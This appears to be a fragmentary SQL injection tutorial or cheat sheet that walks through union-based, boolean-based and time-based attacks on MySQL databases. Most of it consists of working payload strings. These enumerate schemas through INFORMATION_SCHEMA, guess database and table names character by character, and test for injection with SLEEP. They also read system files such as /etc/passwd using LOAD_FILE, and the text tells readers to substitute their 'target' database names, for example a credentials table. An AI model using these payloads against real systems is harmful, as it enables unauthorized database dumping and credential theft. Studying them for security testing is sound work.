...
![https://user-images.githubusercontent.com/79256105/175160165-af1189b5-f22c-41fa-8d8e-7e4e1d14da57.png](https://user-images.githubusercontent.com/79256105/175160165-af1189b5-f22c-41fa-8d8e-7e4e1d14da57.png)
...
as per required we need to replace “or” with “||”. or encoded payload with various format like- URL encoding, base64 etc.
...
### 👁️‍🗨️ For More Payload check payload all things Github repo [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
...
## How to identify Union Base SQL Injection
      ...
      `find out actual column number using order by  / 'order by 1-- - operation`
...
## Database exploits process

### Step1:

`Find total column number`

### Step2:

`Find Database name / schema name`

### Step3:

`find table name in the database`

### Step4:

`Find out name of column`

### Step5:

       `use union base payload in perfect column number to exploit database / dump database`

## Method for dumping data from database for Union SQL Injection
...
by this process we can know the database name list with some default database like- information_schema, mysql, performance_schema etc for mysql database.

### Step 1: Schema/Database check

 `'UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

`Don’t Change INFORMATION_SCHEMA.SCHEMATA`
...
Here , `“dev = database name”` which will replace to your target database name. rest of the part of this code remain unchanged.
...
*** here `credentials` is the table name in the database.

Here , credentials is table name which will replace to your target table name
...
Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
  ...
  Example: `'UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
...
' UNION SELECT 1, LOAD_FILE("/etc/hosts"), 3, 4-- -
```
...
if response is true till 1,2,3 but false in 1,2,3,4 ,the target column ***number is 3***

### Step 2:Find out database name

  `admin123' UNION SELECT 1,2,3 where database() like 'some character%';--`
  example:  `admin123' UNION SELECT 1,2,3 where database() like 's%';--`

Sequentially change the character and check the response is true or false suppose we got the ***database name :sqli_three***

### Step 3:Find out table name

  `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`

Sequentially change the character and check the response is true or false suppose we got the ***table name :users***
...
*** We can try exploit Boolean base sql injection manualy or  we can make this task by using python script
...
*** If the code sleep for the specified time then we can say that there have time base sql injection.
...
### Step 1:Find out actual column number
 ...
 `admin123' UNION SELECT SLEEP(5),null;--`
